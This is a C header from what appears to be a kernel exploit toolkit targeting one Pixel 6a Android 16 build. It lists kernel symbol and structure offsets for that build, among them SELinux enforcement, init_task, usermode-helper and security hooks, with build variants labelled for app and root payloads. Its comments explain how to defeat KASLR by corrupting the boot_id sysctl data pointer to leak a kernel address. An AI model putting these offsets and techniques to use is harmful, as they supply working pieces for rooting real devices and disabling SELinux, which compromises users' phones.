// bluejay — Pixel 6a, Android 16
// Build:     CP1A.260405.005
// Kernel:    6.1.145-android14-11-gfa1d6308d1fe-ab14691759
// Interface: android14-6.1
//
// What this build does not share with its kernel interface. Everything else
// is supplied by the interface header included at the end.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "bluejay-CP1A.260405.005-app"
#else
#define BUILD_VARIANT_LABEL "bluejay-CP1A.260405.005-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/bluejay/bluejay:16/CP1A.260405.005/15001963:user/release-keys"
#endif

// ── Kernel release ──
// Encoded as (major<<16)|(minor<<8)|min(patch,255) so a stage can refuse at
// build time a vehicle whose structure only exists from a given release,
// instead of discovering it on the device.
#define KERNEL_VERSION_CODE 0x060191  // 6.1.145

// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF            0x00c322c8ULL
#define ASHMEM_MMAP_OFF             0x00c32c58ULL
#define ASHMEM_OPEN_OFF             0x00c32e78ULL
#define ASHMEM_RELEASE_OFF          0x00c32f00ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c33020ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF        0x0216c080ULL
#define ASHMEM_FOPS_OFF             0x0127fe88ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c32c00ULL

#define CONFIGFS_READ_ITER_OFF      0x004637e0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00463d10ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
#define COPY_SPLICE_READ_OFF        0x003e57c0ULL
#define NOOP_LLSEEK_OFF             0x00397fc0ULL
#define INIT_TASK_OFF               0x0200f600ULL
#define ROOT_TASK_GROUP_OFF         0x021f7580ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF       0x02249400ULL
#define SELINUX_BLOB_SIZES_OFF      0x015cc608ULL
#define SECURITY_HOOK_HEADS_OFF     0x015cbef8ULL
#define KMALLOC_CACHES_OFF          0x015cba38ULL
#define ANON_PIPE_BUF_OPS_OFF       0x011091d0ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d3680ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x01ffae60ULL

// ── Slide references ──
// Symbols a text-base recovery reads or reaches through.
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF     0x020029c8
// Write-free KASLR (cves/lib/kaslr/README.md): tracing_mark_write _THIS_IP_

#define SLIDE_TRACE_MARK_IP_OFF     0x001f06fcULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF       0x02002918ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x21273c0; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x21274c8.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x021274c8ULL
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF     0x0226a498ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT SLIDE_LOGGERS_0_1

#define MM_OWNER_OFF                  0x338

#define WAITER_LOCAL_OFF              0x80
#define WAITER_TREE_ENTRY_OFF         0x00
#define WAITER_PI_TREE_ENTRY_OFF      0x18
#define WAITER_TASK_OFF               0x30
#define WAITER_LOCK_OFF               0x38
#define WAITER_WAKE_STATE_OFF         0x40
#define WAITER_PRIO_OFF               0x44
#define WAITER_DEADLINE_OFF           0x48
#define WAITER_WW_CTX_OFF             0x50
#define FOPS_POST_LLSEEK_OFF    0x10

#include "../kmi/android14-6.1.h"

#endif
